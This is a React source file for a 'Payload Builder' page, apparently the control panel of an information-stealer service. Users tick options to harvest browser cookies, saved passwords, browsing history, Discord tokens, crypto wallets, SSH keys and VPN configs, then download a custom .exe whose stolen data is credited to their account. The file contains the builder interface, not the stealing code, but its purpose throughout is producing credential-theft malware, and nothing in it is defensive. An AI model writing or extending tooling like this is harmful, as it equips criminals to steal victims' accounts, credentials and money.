import React, { useState, useEffect } from 'react';
import {
    Box,
    Paper,
    Typography,
    FormControlLabel,
    Checkbox,
    Button,
    Grid,
    Card,
    CardContent,
    Alert,
    LinearProgress,
    Chip
} from '@mui/material';
import { Download as DownloadIcon, Build as BuildIcon } from '@mui/icons-material';

function PayloadBuilderPage() {
    const [selectedFeatures, setSelectedFeatures] = useState({
        location: true,
        systemInfo: true,
        runningProcesses: true,
        installedApps: true,
        browserCookies: true,
        savedPasswords: true,
        browserHistory: true,
        discordTokens: true,
        cryptoWallets: true,
        importantFiles: true
    });

    const [isGenerating, setIsGenerating] = useState(false);
    const [error, setError] = useState('');
    const [success, setSuccess] = useState('');
    const [userInfo, setUserInfo] = useState(null);

    useEffect(() => {
        // Get current user info
        const storedUserInfo = localStorage.getItem('userInfo');
        if (storedUserInfo) {
            try {
                const parsed = JSON.parse(storedUserInfo);
                setUserInfo(parsed);
            } catch (e) {
                console.error('Error parsing user info:', e);
            }
        }
    }, []);

    const features = [
        {
            key: 'location',
            title: 'Location Information',
            description: 'Collects IP address, country, city, and coordinates',
            category: 'Basic'
        },
        {
            key: 'systemInfo',
            title: 'System Information',
            description: 'Collects OS version, hardware specs, and system details',
            category: 'Basic'
        },
        {
            key: 'runningProcesses',
            title: 'Running Processes',
            description: 'Lists all currently running applications and processes',
            category: 'System'
        },
        {
            key: 'installedApps',
            title: 'Installed Applications',
            description: 'Scans for installed software and applications',
            category: 'System'
        },
        {
            key: 'browserCookies',
            title: 'Browser Cookies',
            description: 'Extracts cookies from Chrome, Edge, Firefox, and other browsers',
            category: 'Browser'
        },
        {
            key: 'savedPasswords',
            title: 'Saved Passwords',
            description: 'Extracts saved login credentials from browsers',
            category: 'Browser'
        },
        {
            key: 'browserHistory',
            title: 'Browser History',
            description: 'Collects browsing history from all installed browsers',
            category: 'Browser'
        },
        {
            key: 'discordTokens',
            title: 'Discord Tokens',
            description: 'Extracts Discord authentication tokens and user data',
            category: 'Applications'
        },
        {
            key: 'cryptoWallets',
            title: 'Crypto Wallets',
            description: 'Scans for cryptocurrency wallet files and data',
            category: 'Applications'
        },
        {
            key: 'importantFiles',
            title: 'Important Files',
            description: 'Collects configuration files, SSH keys, VPN configs, and other sensitive files',
            category: 'Files'
        }
    ];

    const categories = ['Basic', 'System', 'Browser', 'Applications', 'Files'];

    const handleFeatureChange = (featureKey) => (event) => {
        setSelectedFeatures(prev => ({
            ...prev,
            [featureKey]: event.target.checked
        }));
    };

    const handleSelectAll = (category, select) => {
        const categoryFeatures = features.filter(f => f.category === category);
        const newState = { ...selectedFeatures };
        categoryFeatures.forEach(feature => {
            newState[feature.key] = select;
        });
        setSelectedFeatures(newState);
    };

    const handleGeneratePayload = async () => {
        setIsGenerating(true);
        setError('');
        setSuccess('');

        try {
            const token = localStorage.getItem('authToken');
            if (!token) {
                throw new Error('Not authenticated');
            }

            const response = await fetch('/api/payloads/generate', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'Authorization': `Bearer ${token}`
                },
                body: JSON.stringify({
                    features: selectedFeatures,
                    user: userInfo?.username
                })
            });

            if (!response.ok) {
                const errorData = await response.json().catch(() => ({ message: 'Server error' }));
                throw new Error(errorData.message || `Server error: ${response.status}`);
            }

            // Create download link
            const blob = await response.blob();
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.style.display = 'none';
            a.href = url;
            a.download = `payload_${userInfo?.username || 'unknown'}_${Date.now()}.exe`;
            document.body.appendChild(a);
            a.click();
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);

            setSuccess('Payload generated and downloaded successfully!');
        } catch (err) {
            console.error('Error generating payload:', err);
            setError(err.message || 'Failed to generate payload');
        } finally {
            setIsGenerating(false);
        }
    };

    const getSelectedCount = (category) => {
        return features.filter(f => f.category === category && selectedFeatures[f.key]).length;
    };

    const getTotalSelected = () => {
        return Object.values(selectedFeatures).filter(Boolean).length;
    };

    return (
        <Box sx={{ p: 3 }}>
            <Typography variant="h4" gutterBottom sx={{ display: 'flex', alignItems: 'center', gap: 1 }}>
                <BuildIcon />
                Payload Builder
            </Typography>

            <Typography variant="body1" color="text.secondary" sx={{ mb: 3 }}>
                Create custom payloads that will collect data and send it to your account.
                {userInfo?.username && (
                    <span> Logs will be attributed to: <strong>{userInfo.username}</strong></span>
                )}
            </Typography>

            {error && (
                <Alert severity="error" sx={{ mb: 2 }}>
                    {error}
                </Alert>
            )}

            {success && (
                <Alert severity="success" sx={{ mb: 2 }}>
                    {success}
                </Alert>
            )}

            <Grid container spacing={3}>
                {categories.map(category => (
                    <Grid item xs={12} md={6} key={category}>
                        <Card>
                            <CardContent>
                                <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', mb: 2 }}>
                                    <Typography variant="h6">{category}</Typography>
                                    <Box sx={{ display: 'flex', gap: 1 }}>
                                        <Button
                                            size="small"
                                            onClick={() => handleSelectAll(category, true)}
                                            disabled={getSelectedCount(category) === features.filter(f => f.category === category).length}
                                        >
                                            Select All
                                        </Button>
                                        <Button
                                            size="small"
                                            onClick={() => handleSelectAll(category, false)}
                                            disabled={getSelectedCount(category) === 0}
                                        >
                                            Deselect All
                                        </Button>
                                        <Chip
                                            label={`${getSelectedCount(category)}/${features.filter(f => f.category === category).length}`}
                                            size="small"
                                            color={getSelectedCount(category) > 0 ? "primary" : "default"}
                                        />
                                    </Box>
                                </Box>

                                <Box sx={{ display: 'flex', flexDirection: 'column', gap: 1 }}>
                                    {features.filter(f => f.category === category).map(feature => (
                                        <FormControlLabel
                                            key={feature.key}
                                            control={
                                                <Checkbox
                                                    checked={selectedFeatures[feature.key]}
                                                    onChange={handleFeatureChange(feature.key)}
                                                    color="primary"
                                                />
                                            }
                                            label={
                                                <Box>
                                                    <Typography variant="body2" fontWeight="medium">
                                                        {feature.title}
                                                    </Typography>
                                                    <Typography variant="caption" color="text.secondary">
                                                        {feature.description}
                                                    </Typography>
                                                </Box>
                                            }
                                        />
                                    ))}
                                </Box>
                            </CardContent>
                        </Card>
                    </Grid>
                ))}
            </Grid>

            <Paper sx={{ p: 3, mt: 3, bgcolor: 'background.paper' }}>
                <Box sx={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <Box>
                        <Typography variant="h6" gutterBottom>
                            Payload Summary
                        </Typography>
                        <Typography variant="body2" color="text.secondary">
                            {getTotalSelected()} out of {Object.keys(selectedFeatures).length} features selected
                        </Typography>
                        {userInfo?.username && (
                            <Typography variant="body2" color="text.secondary">
                                Target Account: <strong>{userInfo.username}</strong>
                            </Typography>
                        )}
                    </Box>

                    <Button
                        variant="contained"
                        startIcon={<DownloadIcon />}
                        onClick={handleGeneratePayload}
                        disabled={isGenerating || getTotalSelected() === 0}
                        size="large"
                        sx={{ minWidth: 200 }}
                    >
                        {isGenerating ? 'Generating...' : 'Generate Payload'}
                    </Button>
                </Box>

                {isGenerating && (
                    <Box sx={{ mt: 2 }}>
                        <LinearProgress />
                        <Typography variant="body2" color="text.secondary" sx={{ mt: 1 }}>
                            Building custom payload executable...
                        </Typography>
                    </Box>
                )}
            </Paper>
        </Box>
    );
}

export default PayloadBuilderPage;
